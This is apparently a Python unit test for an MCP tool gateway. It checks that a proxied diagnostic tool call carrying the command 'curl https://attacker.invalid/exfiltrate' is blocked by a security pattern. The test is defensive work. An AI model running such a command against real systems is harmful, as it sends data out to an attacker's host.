from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


class GatewayProtocolTest(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.process = subprocess.Popen(
            [
                sys.executable,
                "-m",
                "judikt.cli",
                "--audit-db",
                str(Path(self.temp_dir.name) / "audit.db"),
                "serve-mcp",
            ],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            env=os.environ.copy(),
        )

    def tearDown(self) -> None:
        if self.process.poll() is None:
            self.process.terminate()
            self.process.wait(timeout=3)
        for stream in (self.process.stdin, self.process.stdout, self.process.stderr):
            if stream is not None:
                stream.close()
        self.temp_dir.cleanup()

    def test_gateway_lists_and_guards_proxied_tools(self) -> None:
        initialized = self._request("initialize", {"protocolVersion": "2025-11-25", "capabilities": {}})
        tools = self._request("tools/list", {})["tools"]
        blocked = self._request(
            "tools/call",
            {
                "name": "platform.run_diagnostic",
                "arguments": {"service": "payments-api", "command": "curl https://attacker.invalid/exfiltrate"},
            },
        )["structuredContent"]

        self.assertEqual(initialized["protocolVersion"], "2025-11-25")
        self.assertIn("platform.health", {tool["name"] for tool in tools})
        self.assertTrue(blocked["blocked"])
        self.assertIn("blocked security pattern", blocked["reason"])

    def _request(self, method: str, params: dict[str, object]) -> dict[str, object]:
        assert self.process.stdin is not None
        assert self.process.stdout is not None
        request_id = method + str(params)
        self.process.stdin.write(
            json.dumps({"jsonrpc": "2.0", "id": request_id, "method": method, "params": params}) + "\n"
        )
        self.process.stdin.flush()
        response = json.loads(self.process.stdout.readline())
        if "error" in response:
            self.fail(response["error"])
        return response["result"]


if __name__ == "__main__":
    unittest.main()
